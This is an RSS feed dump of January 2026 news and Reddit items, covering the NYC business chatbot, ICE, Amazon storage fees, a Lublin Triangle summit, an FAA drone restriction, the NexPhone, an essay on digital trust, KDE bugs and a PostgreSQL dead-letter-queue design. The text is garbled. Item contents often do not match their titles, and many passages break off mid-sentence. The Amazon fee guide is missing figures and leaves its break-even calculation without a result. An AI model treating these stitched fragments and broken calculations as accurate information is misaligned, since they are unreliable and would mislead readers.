There’s little reason for visitors to the chatbot page to distrust the service. Users who visit today get informed the bot “uses information published by the NYC Department of Small Business Services” and is “trained to provide you official NYC Business information.” One small note on the page says that it “may occasionally produce incorrect, harmful or biased content,” but there’s no way for an average user to know whether what they’re reading is false. A sentence also suggests users verify answers with links provided by the chatbot, although in practice it often provides answers without any links. A pop-up notice encourages visitors to report any inaccuracies through a feedback form, which also asks them to rate their experience from one to five stars.The bot is the latest component of the Adams administration’s MyCity project, a portal announced last year for viewing government services and benefits.\
There’s little other information available about the bot. The city says on the page hosting the bot that the city will review questions to improve answers and address “harmful, illegal, or otherwise inappropriate” content, but otherwise delete data within 30 days.\
A Microsoft spokesperson declined to comment or answer questions about the company’s role in building the bot.Since the high-profile release of ChatGPT in 2022, several other companies, from big hitters like Google to relatively niche businesses, have tried to incorporate chatbots into their products. But that initial excitement has sometimes soured when the limits of the technology have become clear.\
In one relevant recent case, a lawsuit filed in October claimed that a property management company used an AI chatbot to unlawfully deny leases to prospective tenants with housing vouchers. In December, practical jokers discovered they could trick a car dealership using a bot into selling vehicles for a dollar.\
In that last case, a Microsoft vice president told NPR that public experimentation was necessary to work out the problems in a bot. “You have to actually go out and start to test it with customers to find these kind of scenarios,” he said.]]></content:encoded></item><item><title>Alex Pretti was killed by ‘Trump’s cowardly ICE thugs’ says parents</title><link>https://www.channel4.com/news/alex-pretti-was-killed-by-trumps-cowardly-ice-thugs-says-parents</link><author>Anushka Asthana</author><category>news</category><pubDate>Sun, 25 Jan 2026 17:56:20 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[The shooting yesterday has caused fury not just here in Minneapolis, but also in Democratic circles, with some Republicans calling for an investigation.Alex Pretti’s parents called his attackers ‘Trump’s murdering and cowardly ICE thugs’.Trump officials say Pretti was carrying a gun and wanted to massacre them.But video of the shooting tells a different story.

And, I can surely tell you that if you are not careful, a few months of stock can turn into a cash-burning nightmare.But, for this, you don’t have to panic. There are concrete, practical steps you can take to get on track.So, What Are Aged Inventory Surcharges?They are Amazon’s extra charges when your inventory sits in their warehouses for too long.Starting in 2026, they are charging around,12–15 months old: $0.30 per unit per month (up from $0.15)15+ months old: $0.35 per unit per month or $7.90 per cubic foot, whichever is higherThe shocking truth here is, yes, this can add up fast. A slow-moving SKU can cost you over a dollar per unit in just three months! Moreover, these fees stack up monthly, so the longer your items sit, the more money you lose.Now, Here Are 7 Simple Workflows to Cut These FeesUse these steps as your survival toolkit for 2026.1. Build an FNSKU Velocity DashboardThe first step is to know which products are sitting too long. So, for this, use Excel or Google Sheets and filter stating, “Days in FBA which are greater than 240.And then, flag items with greater than 90 days’ supply. Sort this weekly by “ IPI Risk” with Liquidate bottom to 20%.Here, the goal is to make sure no SKU stays in FBA for more than 365 days. Ideally, get this dashboard running immediately, and then check weekly.2. Automate 90-Day Removal TriggersMake automation your friend. Use tools like Helium 10 or InventoryLab and set alerts for items approaching 270 days in storage. Then, if you have less than 14 days of supply per week, consider this as fulfilling by yourself (FBM). You can even use the Amazon API to automatically create removal orders when a product hits a certain age in the storage. This will help you keep inventory moving and avoid surprise fees.3. Run a Q4 Liquidation RuleSlow SKUs don’t fix themselves. You need to push them. Here’s a timeline example that works,Oct 1-15: Offer 50% off coupons on 241-365 day inventoryOct 16-31: Use Multi-Channel Fulfillment (MCF) to sell to email lists, which applies approx. 30% fee.Buy Oct 31: Donate or dispose of items, which can save approx. $0.20/unit on light SKUs.A quick math here, avoiding a $0.35/month surcharge for 3 months saves $1.05 per unit. It is not huge individually, but it adds up fast across hundreds or thousands of SKUs.4. Optimize Your PackagingAmazon charges for your packaging based on cubic feet. So, even a small change from your side can save a surprising amount.For example,  if you were using , it may charge you  (0.4*$7.90=$3.16) Now, with a small change of reduction to , it charges you  (0.3*$7.90=$2.37). You are saving $0.79 per month per unit.Even cutting off an inch or two from box dimensions will reduce fees and help your products move faster.5. Try To Avoid West Coast Storage When PossibleOn Amazon, there are some fulfillment centers that cost more. For example, West Coast storage costs around $0.57/ft³, compared to $0.48 elsewhere, which is a 19% premium.So, here is a tip I can give you: Manage your high IPI scores, which further help Amazon favor you with efficient fulfillment centers and reduce inbound placement fees, avoiding approx. 0.7% revenue hit.6. Use Serialized Inventory Audit (Post-Commingling Ban)So, I suggest the following, - Audit serialized UPCs weekly, and switch to wholesale only with proper invoice backing.-  You are safe since you control your own FNSKUsThe immediate action to be taken is to remove all retail arbitrage serialized inventory that's been in FBA for more than 180 days.7. Next, Use a Break-Even CalculatorWhen you decide on discounts or removals, always calculate the break-even price.  Here’s a simple formula that can be used for liquidation discounts: Surcharge /(Selling Price - COGS - FBA Fees).For example,  a $25 item with $10 COGS and $4 FBA fees, that's $0.35/ ($25 - $10 - $4) =  to break even.The 41% figure ignores COGS and fees, making it dangerously high. Always run this calculation before every coupon or removal order to avoid losing money on desperate clearances.Here Is My Suggested Execution TimelineTo make all these manageable, you need to break them into weekly priorities.Week 1- Build your FNSKU dashboardWeek 2- Plan your Q4 liquidation using the rules mentioned aboveWeek 3- Audit all your packaging and optimize itWeek 4: Set up 3PL relationships for hybrid fulfillmentThis sequence will make sure that nothing falls through the cracks and gives you the best chance to avoid penalties in furture.I can clearly tell you that sellers who implement these strategies early have been able to cut aged inventory surcharges by up to 78% in Q1. It is a proactive game where  the less stock you have, the less money you lose.And, if your mid-range SKUs are moving slowly, your readers or business partners need this plan .Taking even a few of these steps, like the dashboard, a quick liquidation push, and packaging optimization, can save hundreds or even thousands of dollars in 2026.:::tip
 slow inventory isn’t just a storage problem. Now, it’s a cash problem.]]></content:encoded></item><item><title>Wine-Staging 11.1 Adds Patches For Enabling Recent Adobe Photoshop Versions On Linux</title><link>https://www.phoronix.com/news/Wine-Staging-11.1</link><author>/u/TheTwelveYearOld</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 17:42:20 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Michael Larabel is the principal author of Phoronix.com and founded the site in 2004 with a focus on enriching the Linux hardware experience.

We cannot do what we do without your support.The presidents of Poland, Ukraine and Lithuania have jointly commemorated the anniversary of the 1863 January Uprising against Russian rule. The trio also held talks focused on security, and in particular Russia’s war in Ukraine.“One reflection that dominated today is that it’s been 163 years since the January Uprising and one thing remains unchanged: Russia is still a threat to the region,” said Poland’s Karol Nawrocki. “Regardless of whether it is Tsarist Russia, Bolshevik Russia or Vladimir Putin’s Russia.”Speaking alongside him, Ukraine’s Volodymyr Zelensky emphasised that the event was a reminder that “aLithuanian President Gitanas Nausėda, who hosted the summit,The January Uprising began on 22 January 1863 in so-called Congress Poland, which was a puppet state of Russia. Its area covered much of modern-day central and eastern Poland, as well as parts of Lithuania.The insurrection initially broke out among Poles conscripted into the Russian army, and was joined by tens of thousands more, including Lithuanians and Belarusians. (Exiled Belarusian opposition leader Sviatlana Tsikhanouskaya also joined today’s ceremonies.)The uprising was brutally suppressed by Russia – with thousands of Poles killed and many more deported to Siberia – and was eventually brought to an end in 1864, though Russian reprisals against the local population continued long after.Today’s meeting took place under the auspices of the Lublin Triangle, a regional alliance established in 2020 between Poland, Lithuania and Ukraine. It is named after the 1569 Treaty of Lublin, which created the Polish-Lithuanian Commonwealth, a state that also contained much of modern-day Ukraine.Speaking afterwards, Nawrocki recalled that the countries of their region had been proven right in their longstanding warnings about Russia. That emphasises why “it is important for the voice of central and eastern Europe, and forums like this one, to be heard worldwide”.He and Nausėda noted that Zelensky had updated them on the progress of peace negotiations, with Nausėda commenting that, “not for the first time, we see Russia not wanting to commit to peace”.Zelensky also said that he was “happy that our partners in Lithuania and Poland support the idea of [Ukraine] joining the European Union”, which is a “priority” for Kyiv.However, although Poland’s government supports Ukrainian membership, Nawrocki – who is aligned with the right-wing opposition and regularly clashes with the government – said last year that he is “against Ukraine’s entry at the moment”.After today’s summit, Nausėda made clear that

"While the technology is not yet a legal requirement in cars, Congress passed a law with the Infrastructure Investment and Jobs Act in 2021 that requires the Department of Transportation to create the mandate."

Republican Representative Thomas Massie of Kentucky introduced an amendment to a federal spending bill that would reverse the mandating of the technology. On Thursday, 160 Republicans voted in favor, but the legislation failed 164-268, according to the House Clerk's official roll call — with 57 Republicans joining 211 Democrats in voting against it... 

The House vote signals substantial Republican support for curbing any move toward mandated impaired-driving prevention systems, but not enough to pass such legislation. Critics of the kill switch technology see it as government overreach, while those in favor argue that it could prove to be lifesaving.

The recent Greenland crisis at Davos 2026 has shattered transatlantic trust, forcing Europe to confront a terrifying new reality: the need for strategic autonomy from the United States. Faced with what it views as transactional coercion, Brussels is readying an arsenal of economic countermeasures, ranging from a "trade bazooka" targeting U.S. tech firms to the highly publicized "financial nuclear option"—the threat of dumping trillions in U.S. Treasuries. But before we panic about a bond market collapse, we need to examine the hard financial realities: Is weaponizing sovereign debt a viable strategy, or is it merely a macroeconomic suicide pact? This video dives into the mechanics of this potential economic war and the high cost of moving from an era of global efficiency to one of fearful autarky

The restriction applies nationwide and continuously, rather than at fixed locations or during defined time windows. Because ICE operates under DHS and routinely conducts enforcement actions using mobile vehicle convoys in public spaces, the restriction functions as a drone no-fly zone around ICE operations, including arrests, transport activities and other field actions. The FAA classifies the restricted airspace as “national defense airspace,” and cites its authority under federal security statutes. Drone operators who violate the restriction may face criminal prosecution, civil penalties, administrative enforcement actions, or revocation of FAA operating privileges. The notice also states that drones deemed a credible security threat may be intercepted, seized, damaged, or destroyed. Unlike traditional Temporary Flight Restrictions, the NOTAM does not provide geographic coordinates, activation times, or public notification when the restriction is in effect near a specific location. Instead, the restricted airspace moves with DHS assets, meaning the no-fly zone can appear wherever ICE or other DHS units operate. The new NOTAM replaces an earlier security notice, FDC 5/6378, which covered similar federal agencies but was less explicit about mobile operations. The updated version removes ambiguity by clearly stating that the restriction applies to moving DHS assets, including vehicles and convoys, and not just fixed facilities such as offices or bases. That clarification has drawn attention from drone operators and civil liberties groups because it creates dynamic, invisible exclusion zones that may be impossible to identify in real time. The FAA does not publish public tracking of DHS or ICE movements, and the NOTAM does not include a mechanism for drone pilots to determine when covered assets are nearby. In practical terms, a drone operator flying legally in a public area could unknowingly enter restricted airspace if an ICE convoy passes within the protected radius. The FAA instructs operators to “exercise caution” when flying near DHS facilities and mobile assets, but offers no specific guidance on how to do so in environments where enforcement activity is not publicly disclosed. The notice mentions limited exceptions. Drone operations conducted in direct support of national defense, homeland security, law enforcement, firefighting, search and rescue, or disaster response missions may be authorized with advance coordination. Operators seeking approval are instructed to coordinate with DHS or other covered agencies, or contact the FAA’s System Operations Support Center. The FAA cites multiple federal statutes as the legal basis for the restriction, including laws governing national defense airspace and counter-UAS mitigation.]]></content:encoded></item><item><title>Any resources to learn about backend principles</title><link>https://www.reddit.com/r/golang/comments/1qmoz92/any_resources_to_learn_about_backend_principles/</link><author>/u/PsychologicalYam7192</author><category>golang</category><category>reddit</category><pubDate>Sun, 25 Jan 2026 17:14:13 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I started learning go today for backend and i quickly realised that i need some backend knowledge to keep going like (routing middleware Auth) similar thing so suggest me some good resources to learn about these i want to make some good projects and please suggest me some good beginner friendly projects ]]></content:encoded></item><item><title>TechCrunch Mobility: RIP, Tesla Autopilot, and the NTSB investigates Waymo</title><link>https://techcrunch.com/2026/01/25/techcrunch-mobility-rip-tesla-autopilot-and-the-ntsb-investigates-waymo/</link><author>Kirsten Korosec</author><category>tech</category><pubDate>Sun, 25 Jan 2026 17:06:00 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[Welcome back to TechCrunch Mobility — your central hub for news and insights on the future of transportation. ]]></content:encoded></item><item><title>Latest news bulletin | January 25th, 2026 – Evening</title><link>https://www.youtube.com/watch?v=rFTMr_nB_gM</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/rFTMr_nB_gM?version=3" length="" type=""/><pubDate>Sun, 25 Jan 2026 17:05:00 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Latest news bulletin | January 25th, 2026 – Evening

Its unique ecosystem is threatened with destruction. Despite objections, politicians and entrepreneurs are allowing hydroelectric power plants to be built here. But resistance to the plans remains strong.

Over the past millennia, the Neretva has developed into a globally unique ecosystem. It is home to animal and plant species that exist nowhere else. But the "Blue Heart of Europe,” as the Neretva is also known, is threatened with collapse.

Politicians and entrepreneurs see new power plants as opportunities to generate sustainable energy — and rake in big money. Local residents and scientists, on the other hand, have serious doubts about the projects. This is because the construction of a dam changes the natural environment forever.

Boban Škrtar lives a few kilometers above the planned main dam in the village of Ulog. On the riverbank, he explains the devastating impact of the construction project to date: "Everything here used to be forest. It was cleared for the dam, and you can see that now everything is destroyed. There used to be a swimming area and a campsite there, but now everything is gone forever."
On the other side of the dam, Austrian aquatic ecologist Kurt Pinter is searching for the softmouth trout—a fish thought to live in just four river systems, including the Neretva. His hope is that if the softmouth trout is declared an endangered endemic species in this part of the river system, the construction of some 70 new power plants along the Neretva may be prevented.

My company has a quite complex environment/subenvironment structure, and it makes managing configs a living nightmare. Thats before you even get to the complex domain specific helm chart that only the devops team truly understands, and stringly typed gotmpls that need to pipe nested configs through flat env vars. If I have to pipe a yaml into a gotmpl into an application.conf into my actual config class one more time, I might lose my mind, not to mention that literally every step of that process is untyped and can break without warning.What are yalls biggest pain points in this area? Are all these pain points Im having a solved problem and my company just isnt using the right tools, or is there a real gap that we are all just putting up with because "it works"?This whole thing has given me an idea for a solution that I think makes the whole process way easier, inverts control so the tool can do the core logic, and passes off to your programming language of choice so that your configs can be strongly typed. If it compiles, it runs. Ive got some initial POCs working, but wanted to get some feedback from the community on whether this is really an area that needs improvement, or if my company is just behind the times.]]></content:encoded></item><item><title>C++ RAII guard to detect heap allocations in scopes</title><link>https://github.com/mkslge/noalloc-cpp</link><author>/u/North_Chocolate7370</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 16:42:59 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Needed a lightweight way to catch heap allocations in cpp, couldn’t find anything simple, so I built this.

Purism chose it as the docking station for their Librem 5 phones. 

But now Nex is offering its own smartphone "that runs Android 16, launches Debian, and dual-boots into Windows 11," according to the blog It's FOSS:


Fourteen years after the first concept video was teased, the NexPhone is here, powered by a Qualcomm QCM6490, which, the keen-eyed among you will remember from the now-discontinued Fairphone 5. 

By 2026 standards, it's dated hardware, but Nex Computer doesn't seem to be overselling it, as they expect the NexPhone to be a secondary or backup phone, not a flagship contender. The phone includes an Adreno 643 GPU, 12GB of RAM, and 256GB of internal storage that can be expanded up to 512GB via a microSD card. 

In terms of software, the NexPhone boots into NexOS, a bloatware-free and minimal Android 16 system, with Debian running as an app with GPU acceleration, and Windows 11 being the dual-boot option that requires a restart to access. ["And because the default Windows interface isn't designed for a handheld screen, we built our own Mobile UI from the ground up to make Windows far easier to navigate on a phone," notes a blog post from Nex founder/CEO Emre Kosmaz]. 

And, before I forget, you can plug the NexPhone into a USB-C or HDMI display, add a keyboard and mouse to transform it into a desktop workstation. 
There's a camera plus "a comprehensive suite of sensors," according to the article, "that includes a fingerprint scanner, accelerometer, magnetometer, gyroscope, ambient light sensor, and proximity sensor.... 

"NexPhone is slated for a Q3 2026 release (July-September)..." 

Back in 2012, explains Nex founder/CEO Emre Kosmaz, "most investors weren't excited about funding new hardware. One VC even told us, 'I don't understand why anyone buys anything other than Apple'..."


Over the last decade, we kept building and shipping — six generations of NexDock — helping customers turn phones into laptop-like setups (display + keyboard + trackpad). And now the industry is catching up faster than ever. With Android 16, desktop-style experiences are becoming more native and more mainstream. That momentum is exactly why NexPhone makes sense today... 

Thank you for being part of this journey. With your support, I hope NexPhone can help move us toward a world where phones truly replace laptops and PCs — more often, more naturally, and for more people.]]></content:encoded></item><item><title>Does Trust Require Legitimacy?</title><link>https://hackernoon.com/does-trust-require-legitimacy?source=rss</link><author>Andrei Mochola</author><category>tech</category><pubDate>Sun, 25 Jan 2026 16:31:28 +0000</pubDate><source url="https://hackernoon.com/">Tech - HackerNoon</source><content:encoded><![CDATA[Trust. Governance. What was the third one… Legitimacy. It’s not a prerequisite for trust or governance, but rather the condition that decides their limits.Why Digital Systems Can Function Without It - Until They Can’tDigital trust is often discussed as if it were a moral achievement. If users stay, if adoption grows, if systems function at scale, then trust must exist - and ==if trust exists, legitimacy is assumed to follow==. This assumption is very comfortable. It allows platforms, institutions, and infrastructures to treat trust as an output of performance rather than as a consequence of authority that has been earned.But comfort is not accuracy.==Trust and legitimacy are not the same thing==. They do not arise from the same conditions, they do not perform the same function, and - crucially - they do not fail in the same way. Digital systems have become remarkably good at generating trust without legitimacy. They have become far less capable of surviving what follows.This distinction matters now because digital platforms no longer merely mediate interaction. They allocate visibility, enforce rules, resolve disputes, exclude participants, and reshape incentives. They govern. And governance without legitimacy is not neutral - it is fragile.The argument itself tends to ==divide people who build systems from those who live under them==.Trust Without Legitimacy Is Not a ContradictionTrust, in its most basic sense, is instrumental. It is a mechanism humans use to reduce complexity in situations ==where full knowledge is impossible==. According to Niklas Luhmann, trust allows action in the absence of certainty. It does not require moral approval. It does not require fairness. It requires only a sufficiently stable expectation that the system will behave as anticipated. But… will it behave?This is why trust can exist in deeply asymmetric, unequal relationships. ==Users trust platforms they do not understand==. Citizens trust institutions they do not control. Workers trust systems that can penalize them, in the end. Examples would trigger endless disputes, so - at least for now - let’s stop here. The bottom line is that trust arises not because power is justified, but because outcomes are predictable enough to navigate through conveniently. And feel somehow secure in that sailing (we’ll touch on security versus convenience a bit more in the future).Digital systems excel at this. Interfaces are consistent. Processes are automated. Friction is minimized. Over time, ==habit replaces evaluation==. Trust becomes procedural - not reflective, not consensual, but functional. This is where we should pay some attention.There is nothing inherently wrong with this. Trust has always operated this way. What is often misunderstood is what trust does  provide, mainly trust does not grant authority. It does not confer moral standing, also. And it does not imply consent. Remember all those clickwrap agreements you submit everyday without understanding actually what you’re agreeing to?Legitimacy, by contrast, is normative. It concerns whether power  to be exercised, not whether it  be navigated. It asks whether rules are justified, ==whether decision-makers are accountable==, and whether those subject to authority have reason to recognise it as rightful.A system can be trusted and illegitimate at the same time. History offers countless examples, mainly in politics, but not limited to. Digital platforms are simply the most recent and the most efficient these days.When Usage Is Mistaken for ConsentOne of the most persistent errors in digital governance is the belief that continued participation implies agreement. If users stay, the logic goes, they must accept the rules. If they accept the rules, the system is legitimate. Ditto.This reasoning collapses the moment power asymmetry is taken seriously.Social contract theory has long distinguished between compliance and consent. Hobbes understood obedience as a condition of order, not legitimacy. A look back reveals that Locke insisted that authority remains conditional - tolerable only so long as it serves those governed. Rousseau went further, arguing that ==legitimacy requires participation in the formation of the rules themselves==.Digital platforms quietly bypass these distinctions - who reads philosophers these days? Participation is measured, not deliberated. Consent is embedded in terms of service. Exit is theoretically available but practically constrained by lock-in, network effects, professional dependency, or social cost. The last one is bigger ==the longer the service is used==. What seems to be Kensington High Street at first sight may quickly become Kensington Avenue.The result is a form of coerced continuity: users remain not because they agree, but because alternatives are absent, impractical, or invisible. Trust persists because daily interaction demands it. Legitimacy remains unexamined because questioning it offers no clear remedy.This is why metrics of engagement, retention, or satisfaction cannot substitute for legitimacy. They measure adaptation to power, not acceptance of it. They reveal how well users cope with governance, not whether governance is justified.Mistaking usage for consent is not a neutral analytical error. ==It allows systems to expand authority without ever confronting its moral basis==.Trust as a Substitute for LegitimacyDigital systems often compensate for legitimacy deficits through performance. As long as platforms are fast, convenient, and effective, trust fills the gap. Users tolerate opaque rules because outcomes remain favourable. Institutions avoid justification because efficiency silences dissent.This strategy works. Until it doesn’t.Trust can mask illegitimacy, but it cannot erase it. Instead, it accumulates what might be called legitimacy debt. Each unilateral rule change, unexplained decision, or unchallengeable enforcement action draws against a reserve that trust temporarily supplies.The problem is not gradual erosion. ==Trust rarely collapses slowly==. It breaks when expectations collide with power. Moments of crisis - moderation disputes, data misuse, sudden policy shifts, unexplained exclusions - expose the underlying structure. At that point, trust no longer reduces complexity. It amplifies betrayal.Legitimacy fails differently. It does not depend on flawless outcomes. It depends on the justification. Systems with legitimacy can survive error because they can explain themselves, correct themselves, and be challenged without unraveling.Systems without legitimacy have only performance to defend them; or convenience offered to its users (quite often misused, isn’t?). When performance or convenience falter, there is nothing beneath it. This also why many platform are paranoid about its performance and convenience (often called ).This is why digital trust crises often appear sudden and disproportionate. But, they are not sudden at all, they are deferred.At this point, it is tempting to retreat into familiar solutions: transparency dashboards, better UX, clearer communication, smarter systems. These are certainly useful, very useful and needed, but none of them address legitimacy.The problem is not that we lack trust, as Onora O’Neill has argued, but that ==we conflate trustworthiness with reliability==. Reliable systems can still be unaccountable. Transparent processes can still be unjustified same way as automation can obscure responsibility rather than clarify it.Legitimacy requires governance structures that constrain power, not merely optimise it. It requires identifiable authority, predictable rules, and mechanisms for contestation. It requires the possibility of saying “no” - and being heard. And address that “no” when it’s being heard.This is highly uncomfortable in digital contexts because it challenges the fiction of neutrality. Platforms often present themselves as technical systems rather than governing institutions (they only allow, they only enable, they only offer the choice or possibility). But governance does not disappear when it is denied. ==It becomes unaccountable==.The critical point is this: trust can motivate cooperation, but only legitimacy can justify obligation. When interests align, trust is enough. When they diverge, only legitimacy holds.Digital systems do not face a crisis of trust. They face a  that trust has temporarily postponed.The real question is not whether users trust platforms today. It is whether platforms are prepared to justify their authority tomorrow - when trust is no longer sufficient, when conflict emerges, when performance or convenience no longer compensates for power.Trust buys time. Legitimacy buys durability.As digital infrastructures continue to govern more aspects of economic, social, and civic life, the distinction will become harder to ignore. Systems that confuse trust for consent will discover that cooperation can vanish overnight. Systems that ground authority in legitimacy will survive disagreement, error, and change.Digital trust does not fail because people stop believing. ==It fails when systems refuse to justify why they should be believed in at all==.Further Reading & Conceptual ReferencesHobbes, T. –  (Authority and order under asymmetry)Locke, J. – Two Treatises of Government (Conditional legitimacy)Luhmann, N. –  (Trust as complexity reduction)O’Neill, O. –  (Trustworthiness vs reliability)Weber, M. –  (Legitimate authority and recognition)Beetham, D. – The Legitimation of Power (Rules, justification, and consent)Scharpf, F.

I’ve spent years skimming GitHub releases and changelogs, and I still miss breaking changes or security fixes until they bite me during an upgrade.A few weeks ago I finally decided to stop complaining about it and try to build a better workflow for myself.I built a small tool that watches a set of CNCF and open source projects, pulls new releases, and uses AI to summarise long changelogs. It highlights breaking changes and flags CVEs when they appear in the notes. You can choose how you want updates delivered: per release, daily digest, or weekly summary, via email or webhooks.As part of the project I also wrote my first MCP server so I could query release data from my own tools and from AI assistants.

But I only have problems with KDE Plasma</title><link>https://www.reddit.com/r/linux/comments/1qmnqf1/after_my_first_months_of_being_a_linux_user_i/</link><author>/u/TheGoodSatan666</author><category>reddit</category><pubDate>Sun, 25 Jan 2026 16:29:18 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[I know this will trigger some hardcore KDE Plasma users, so first I want to say that I don't hate KDE Plasma. I love how KDE Plasma works and I like using it. But that doesn't change the fact that I only really had issues with it. If You know fixes for the issues I named then let Me knowI've been using Linux (Fedora 43 to be exact) for some months now. I decided to use it with KDE Plasma as that was what People recommended when coming from Windows (And gnome just wasn't something for Me).I really started to love Linux. I even removed my Windows install as I really don't have a need for it anymore and I exclusively do everything on Linux now. I also started ricing a bit, I first used Konsole but later switched to Kitty and ZSH, built my own config etc etc...But... Every single bug and issue I encountered in this time was  an issue related to Kwin/Plasma.Here is a list of all the bugs I encountered:-Sleep does simply not work for Me. Once my main screen went into sleep it  manages to wake up again until I disconnect the power cable and plug it back in-Everytime I want to move a focused window on my main screen to a second virtual desktop it'll move a completely unrelated window that isn't in focus on my second screen onto the second virtual desktop instead. And when I try to move a window from my second screen to my second virtual desktop it'll move one from my main screen instead.-When I set the Window opening position to "center" or "smart" in KDE Plasma. It'll completely ignore those settings and always place them somewhere else. When I put it on "center" it'll place it on the bottom right of my screens, if I put it to "smart" it'll place it somewhere randomly.-When I turn my second screen off, it'll crash the Plasma shell. If i turn my second screen back on, it'll crash Plasma shell as well.-The widget configuration menu is completely bugged out, it's insanely laggy, often ignores input and honestly has so many issues that I can't even remember all of them-When I place widgets on my desktop and reboot, they'll have a slightly different size than when I originally placed themetc. These aren't even all the issues I had with itAnd just to be clear. I use recent hardware, I don't use anything exotic and I do have all the drivers that I need. I also tested it with different screens and I rebuild many binaries to see if maybe something was currupted. BUT. Even after I reinstalled the entire system on seperate drives I had the exact same issues as before. My screens also don't use any specific drivers, firmware or software. So I can assure You that my screens aren't the problem here. My GPU is an MSI RTX 4070 Super which normally runs pretty great on Linux (Atleast for Nvidia cards)I also want to say that every single other thing works absolutely perfect. My terminal has no issues, my programs run perfectly and generelly everything is perfect except for things related to Kwin/PlasmaIdk if it's because I'm running an Nvidia card (I am using the newest rpmfusion drivers), idk if it's some weird wayland issue. And idk if it's because my main screen is an ultrawide display. Whatever it is, it's driving Me insane.So... I know I'll get tons of "I never had these issues" comments. And that doesn't surprise Me. Idk if there is just some weird demon that wants to ruin my KDE Plasma experience or something. But for now the only other option I see is to switch to something elseSo. What would You recommend to Me? I need something customizable, beautiful, preferebly using Wayland that works great on Fedora 43 and with Nvidia cards. It should also not be GNOME please. It doesn't really need to be a traditional desktop environment.]]></content:encoded></item><item><title>What is Bending Spoons?

                        While I was working on a project with Wayfair, I got the opportunity to work on a system that generated daily business reports aggregated from multiple data sources flowing through event streams across Wayfair. At a high level, Kafka consumers listened to these events, hydrated them with additional data by calling downstream services, and finally persisted the enriched events into a durable datastore—CloudSQL PostgreSQL on GCP.
                    
                        When everything was healthy, the pipeline worked exactly as expected. Events flowed in, got enriched, and were stored reliably. The real challenge started when things went wrong, which, in distributed systems, is not an exception but a certainty.
                    
                        There were multiple failure scenarios we had to deal with. Sometimes the APIs we depended on for hydration were down or slow. Sometimes the consumer itself crashed midway through processing. In other cases, events arrived with missing or malformed fields that could not be processed safely. These were all situations outside our direct control, but they still needed to be handled gracefully.
                    
                        This is where the concept of a Dead Letter Queue came into the picture. Whenever we knew an event could not be processed successfully, instead of dropping it or blocking the entire consumer, we redirected it to a DLQ so it could be inspected and potentially reprocessed later.
                    
                        Our first instinct was to use Kafka itself as a DLQ. While this is a common pattern, it quickly became clear that it wasn't a great fit for our needs. Kafka is excellent for moving data, but once messages land in a DLQ topic, they are not particularly easy to inspect. Querying by failure reason, retrying a specific subset of events, or even answering simple questions like "what failed yesterday and why?" required extra tooling and custom consumers. For a system that powered business-critical daily reports, this lack of visibility was a serious drawback.
                    
                        That's when we decided to treat PostgreSQL itself as the Dead Letter Queue.
                    
                        Instead of publishing failed events to another Kafka topic, we persisted them directly into a DLQ table in PostgreSQL. We were already using CloudSQL as our durable store, so operationally this added very little complexity. Conceptually, it also made failures first-class citizens in the system rather than opaque messages lost in a stream.
                    
                        Whenever an event failed processing—due to an API failure, consumer crash, schema mismatch, or validation error—we stored the raw event payload along with contextual information about the failure. Each record carried a simple status field. When the event first landed in the DLQ, it was marked as . Once it was successfully reprocessed, the status was updated to . Keeping the state model intentionally minimal made it easy to reason about the lifecycle of a failed event.
                    DLQ Table Schema and Indexing Strategy
                        To support inspection, retries, and long-term operability, the DLQ table was designed to be simple, query-friendly, and retry-aware.
                    CREATE TABLE dlq_events (
    id BIGSERIAL PRIMARY KEY,
    event_type VARCHAR(255) NOT NULL,
    payload JSONB NOT NULL,
    error_reason TEXT NOT NULL,
    error_stacktrace TEXT,
    status VARCHAR(20) NOT NULL, -- PENDING / SUCCEEDED
    retry_count INT NOT NULL DEFAULT 0,
    retry_after TIMESTAMP WITH TIME ZONE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
);Key Design Considerations is stored as  to preserve the raw event without enforcing a rigid schema. keeps the lifecycle simple and explicit. prevents aggressive retries when downstream systems are unstable. allows retry limits to be enforced without external state.Timestamps make auditing and operational analysis straightforward.CREATE INDEX idx_dlq_status
ON dlq_events (status);

CREATE INDEX idx_dlq_status_retry_after
ON dlq_events (status, retry_after);

CREATE INDEX idx_dlq_event_type
ON dlq_events (event_type);

CREATE INDEX idx_dlq_created_at
ON dlq_events (created_at);
                        These indexes allow the retry scheduler to efficiently locate eligible events while still supporting fast debugging and time-based analysis without full table scans.
                    DLQ Retry Mechanism with ShedLock
                        Persisting failed events solved the visibility problem, but we still needed a safe and reliable way to retry them.
                    
                        For this, we introduced a DLQ retry scheduler backed by ShedLock. The scheduler periodically scans the DLQ table for  events that are eligible for retry and attempts to process them again. Since the service runs on multiple instances, ShedLock ensures that only one instance executes the retry job at any given time. This eliminates duplicate retries without requiring custom leader-election logic.
                    dlq:
  retry:
    enabled: true
    max-retries: 240
    batch-size: 50
    fixed-rate: 21600000 # 6 hours in millisecondsThe scheduler runs every six hours.Up to fifty eligible events are picked up per run.Events exceeding the maximum retry count are skipped.Successful retries immediately transition the event status to .Failures remain in  and are retried in subsequent runs.
                        The retry scheduler uses a SQL query with  to safely select eligible events across multiple instances. This PostgreSQL feature ensures that even if multiple scheduler instances run simultaneously, each will pick up different rows without blocking each other:
                    @QueryHints(@QueryHint(name = "jakarta.persistence.lock.timeout", value = "-2"))
@Query(
    value = "SELECT * FROM dlq_table "
        + "WHERE messagetype = :messageType "
        + "AND retries < :maxRetries "
        + "AND (replay_status IS NULL OR replay_status NOT IN ('COMPLETED')) "
        + "ORDER BY created_at ASC "
